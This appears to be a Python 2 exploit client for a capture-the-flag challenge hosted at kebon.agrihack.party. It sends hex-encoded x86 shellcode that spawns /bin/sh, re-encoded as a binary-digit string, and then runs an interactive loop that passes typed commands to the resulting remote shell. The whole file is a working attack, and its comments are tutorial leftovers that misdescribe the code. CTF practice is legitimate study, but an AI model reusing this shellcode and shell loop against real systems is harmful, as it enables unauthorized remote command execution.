#!/usr/bin/python           # This is client.py file

import socket               # Import socket module

s = socket.socket()         # Create a socket object
host = "kebon.agrihack.party" # Get local machine name
port = 30002         # Reserve a port for your service.

hexpayload = "31c9f7e1b00b51682f2f7368682f62696e89e3cd80"
binarypayload = bin(int(hexpayload, 16))[2:]
payload = "00" + binarypayload
s.connect((host, port))
data = s.recv(2048)
print data

s.send(payload + "\n")

while True:
        data = s.recv(2048)
        print data

        input = raw_input("CMD> ")
        s.sendall(input + "\n")

s.close()

